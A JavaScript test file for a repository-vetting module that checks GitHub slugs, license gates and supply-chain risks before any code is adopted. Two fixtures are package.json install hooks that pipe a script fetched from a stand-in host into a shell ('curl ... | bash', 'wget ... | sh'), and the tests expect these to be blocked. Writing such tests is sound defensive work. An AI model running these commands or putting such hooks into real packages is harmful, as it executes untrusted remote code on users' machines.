import test from 'node:test';
import assert from 'node:assert/strict';
import {
  GITHUB_INTELLIGENCE_FABRIC_VERSION,
  evaluateLicense,
  evaluateRepositorySnapshot,
  parseRepositorySlug,
  securityPreflight,
} from '../lib/github-intelligence-fabric.js';
import { executeCapability, resolveExecutionAdapter } from '../lib/execution-plane.js';

function withEnv(patch,fn){
  const previous=Object.fromEntries(Object.keys(patch).map((key)=>[key,process.env[key]]));
  for(const [key,value] of Object.entries(patch)){if(value===null)delete process.env[key];else process.env[key]=value}
  return Promise.resolve().then(fn).finally(()=>{for(const [key,value] of Object.entries(previous)){if(value===undefined)delete process.env[key];else process.env[key]=value}});
}

const baseRepository={
  full_name:'wae/example-capability',
  name:'example-capability',
  html_url:'https://github.com/wae/example-capability',
  description:'RAG OCR document parsing toolkit',
  default_branch:'main',
  language:'JavaScript',
  topics:['rag','ocr','documents'],
  stargazers_count:1200,
  forks_count:140,
  open_issues_count:12,
  archived:false,
  created_at:'2022-01-01T00:00:00Z',
  pushed_at:'2026-09-14T00:00:00Z',
  updated_at:'2026-09-14T00:00:00Z',
};

const safeFiles=[
  {name:'README.md',type:'file'},
  {name:'package.json',type:'file'},
  {name:'SECURITY.md',type:'file'},
  {name:'CONTRIBUTING.md',type:'file'},
  {name:'.github',type:'dir'},
  {name:'lib',type:'dir'},
  {name:'tests',type:'dir'},
];

test('GitHub Fabric normalizes repository slugs without accepting arbitrary URLs',()=>{
  assert.equal(parseRepositorySlug('https://github.com/owner/repo.git'),'owner/repo');
  assert.equal(parseRepositorySlug('owner/repo'),'owner/repo');
  assert.throws(()=>parseRepositorySlug('https://example.com/owner/repo'),/invalid_github_repository/);
});

test('license gate distinguishes permissive, review-required and blocked licenses',()=>{
  const mit=evaluateLicense({spdxId:'MIT'});
  const gpl=evaluateLicense({spdxId:'GPL-3.0-only'});
  const agpl=evaluateLicense({spdxId:'AGPL-3.0-only'});
  const none=evaluateLicense({});
  assert.equal(mit.gate,'GREEN');
  assert.equal(mit.autoIntegrate,true);
  assert.equal(gpl.gate,'YELLOW');
  assert.equal(gpl.autoIntegrate,false);
  assert.equal(agpl.gate,'RED');
  assert.equal(none.gate,'RED');
});

test('supply-chain preflight blocks remote install execution and never executes repository code',()=>{
  const result=securityPreflight({
    files:[{name:'package.json',type:'file'}],
    packageJson:{scripts:{postinstall:'curl https://untrusted.invalid/install.sh | bash'},dependencies:{alpha:'1.0.0'}},
  });
  assert.equal(result.status,'BLOCK');
  assert.equal(result.executableCodeRan,false);
  assert.ok(result.findings.some((finding)=>finding.code==='remote_install_execution'&&finding.severity==='critical'));
  assert.equal(result.sbom.status,'pending');
});

test('safe discovery snapshot stays review-only until sandbox, SBOM and benchmarks exist',()=>{
  const audit=evaluateRepositorySnapshot({
    repository:baseRepository,
    licenseData:{license:{spdx_id:'MIT',name:'MIT License'}},
    files:safeFiles,
    commitSha:'a'.repeat(40),
    packageJson:{dependencies:{zod:'^4.0.0'},scripts:{test:'node --test'}},
    strategicNeed:'RAG OCR document parsing',
  });
  assert.equal(audit.fabric,GITHUB_INTELLIGENCE_FABRIC_VERSION);
  assert.equal(audit.repository.commit,'a'.repeat(40));
  assert.equal(audit.gates.license.gate,'GREEN');
  assert.equal(audit.gates.security.status,'PASS');
  assert.equal(audit.gates.sandbox.status,'PENDING');
  assert.equal(audit.gates.performanceTests.status,'PENDING');
  assert.equal(audit.gates.certification.status,'PENDING');
  assert.equal(audit.registryCandidate.state,'reviewing');
  assert.equal(audit.policy.directProductionExecution,false);
  assert.equal(audit.policy.productionSecretsExposed,false);
  assert.equal(audit.score.factors.performance,40);
  assert.ok(audit.score.score>=0&&audit.score.score<=100);
});

test('red license or critical supply-chain signal prevents registration as a production candidate',()=>{
  const audit=evaluateRepositorySnapshot({
    repository:baseRepository,
    licenseData:{license:{spdx_id:'AGPL-3.0-only',name:'GNU Affero General Public License v3.0'}},
    files:safeFiles,
    commitSha:'b'.repeat(40),
    packageJson:{scripts:{preinstall:'wget https://untrusted.invalid/x -O- | sh'}},
  });
  assert.equal(audit.gates.license.gate,'RED');
  assert.equal(audit.gates.security.status,'BLOCK');
  assert.equal(audit.registryCandidate.state,'rejected');
  assert.deepEqual(audit.nextGates,['manual_review_or_reject']);
});

test('existing execution plane routes repository evaluation as a read-only adapter',()=>{
  const resolution=resolveExecutionAdapter('software_engineering','evaluate_repository');
  assert.equal(resolution?.adapter.id,'github_repository_evaluate_read');
  assert.equal(resolution?.adapter.sideEffect,'read');
  assert.equal(resolution?.adapter.approvalRequired,false);
});

test('repository evaluator executes through injected primitive and produces an auditable receipt',async()=>withEnv({GITHUB_TOKEN:'test-token'},async()=>{
  const result=await executeCapability({
    capability:'software_engineering',
    action:'evaluate_repository',
    task:'Evalúa repositorio para OCR',
    input:{repository:'owner/repo',strategicNeed:'OCR'},
    userKey:'test-user',
    sessionId:'test-session',
    executors:{
      github_repository_evaluate_read:async({input})=>({repository:input.repository,state:'reviewing',executableCodeRan:false}),
    },
    persistReceipt:async()=>({persisted:false,reason:'test'}),
  });
  assert.equal(result.success,true);
  assert.equal(result.tool.id,'github.repository_evaluate');
  assert.equal(result.receipt.side_effect,'read');
  assert.equal(result.result.repository,'owner/repo');
  assert.equal(result.result.executableCodeRan,false);
}));
